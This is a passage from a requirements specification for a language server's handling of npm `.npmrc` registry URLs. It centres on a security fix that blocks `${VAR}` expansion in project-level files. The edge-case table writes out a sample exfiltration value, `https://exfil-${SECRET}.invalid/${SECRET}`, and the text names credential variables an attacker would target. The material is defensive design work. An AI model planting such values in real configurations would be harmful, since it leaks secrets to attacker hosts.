...
| FR-007 | **Amended by issue #1420 — see FR-007a.** WHEN a **user-tier** (`~/.npmrc`) `registry=` or `@scope:registry=` value contains a `${VAR}` environment-variable placeholder (npm's own `.npmrc` env-interpolation syntax) THE SYSTEM SHALL expand `VAR` from the LSP server's process environment when it is set, then validate the expanded string per FR-006; WHEN `VAR` is not set THE SYSTEM SHALL treat the value as invalid per FR-006, never attempting to fetch the literal `${VAR}`-containing string as a URL. Expansion SHALL apply only to these two registry-URL key shapes — no auth-shaped key is parsed at all (FR-013/NFR-001), so no credential is ever expanded — and the FR-006 warning SHALL log the raw, unexpanded value so a rejected expansion cannot leak an environment variable's contents | must |
| FR-007a | **(New, issue #1420 — High-severity fix.)** WHEN a **project-tier** (ancestor-walked) `registry=` or `@scope:registry=` value contains `${` (npm's env-interpolation syntax) THE SYSTEM SHALL reject the entry outright per FR-006 (`CustomRegistry`, fail-closed) **without ever calling FR-007's expansion**, regardless of whether the named variable is defined. Rationale: FR-007's original text treated npm's two tiers as policy-symmetric (NFR-003(a)) because phase 1 carries no credential provenance to protect from a network-reachability standpoint — but `${VAR}` expansion is a different threat axis: it reads the *server's own process environment*, and a project-tier `.npmrc` is attacker-controlled the instant a hostile repository is cloned. An attacker can therefore name an arbitrary environment variable (`GITHUB_TOKEN`, `NPM_TOKEN`, `AWS_SECRET_ACCESS_KEY`, ...) and have its value embedded into a URL this server then fetches, exfiltrating it via DNS/HTTPS to an attacker-chosen host — a class FR-007's own "no auth-shaped key is parsed" defense does not cover, since the leak is the *value* of an arbitrary variable, not an npm-auth-shaped `.npmrc` key. No partial-interpolation carve-out (e.g. "allow a value that is exactly one whole `${VAR}` placeholder") is offered: full fail-closed for the entire project tier is the only shape verified safe | must — security-blocking |
...
| NFR-003 | Security | Residual risk, must be stated for security-reviewer sign-off before implementation merges, identical in shape to Cargo's NFR-003: even with NFR-001/002 satisfied, an unauthenticated HTTPS GET to a workspace-declared index still occurs, which is reachability into the user's internal network usable for existence probing by a hostile repository — mitigated identically by `registries.workspace_registries` defaulting to `public_only`. Two divergences from Cargo need explicit sign-off: (a) npm's user-tier `~/.npmrc` is gated by the *same* `registries.workspace_registries` reachability policy as the project tier, where Cargo treats `$CARGO_HOME` as trusted-by-definition (npm phase 1 has no credential provenance to protect from a *network-reachability* standpoint, so its tiers stay policy-symmetric *for that gate*) — **this symmetry claim does not extend to `${VAR}` expansion (FR-007/FR-007a, issue #1420)**, which is gated asymmetrically by tier because it reads the server's own process environment, a materially different threat than an unauthenticated GET; (b) per FR-008 the policy is shared across every ecosystem, so widening it for npm also widens it for Cargo |
...
| **User-tier** `~/.npmrc`: `registry=${UNDEFINED_VAR}` | Treated as invalid per FR-007; no fetch attempted with the literal placeholder string |
| **User-tier** `~/.npmrc`: `registry=${DEFINED_VAR}` where the variable holds a valid https URL | Expanded and resolved normally (FR-007) — the expanded value is still subject to the full FR-006/FR-008 validation and policy gate |
| **User-tier** `~/.npmrc`: `registry=${DEFINED_VAR}` where the variable holds an invalid or policy-blocked URL | Fails closed per FR-006; the warning logs the **raw** `${DEFINED_VAR}` text, never the expanded value |
| **Project-tier** (ancestor-walked) `.npmrc`: `registry=https://exfil-${SECRET}.invalid/${SECRET}` — `SECRET` defined | Rejected outright per FR-007a (issue #1420), *before* expansion ever runs — `CustomRegistry { url: "https://exfil-${SECRET}.invalid/${SECRET}" }` (raw, unexpanded); no fetch, no DNS/HTTPS request, `SECRET`'s value never leaves the process |
| **Project-tier** `.npmrc`: `registry=${VAR}` — `VAR` undefined | Same FR-007a rejection as the defined case above — undefined-vs-defined is irrelevant at this tier, since expansion never runs |
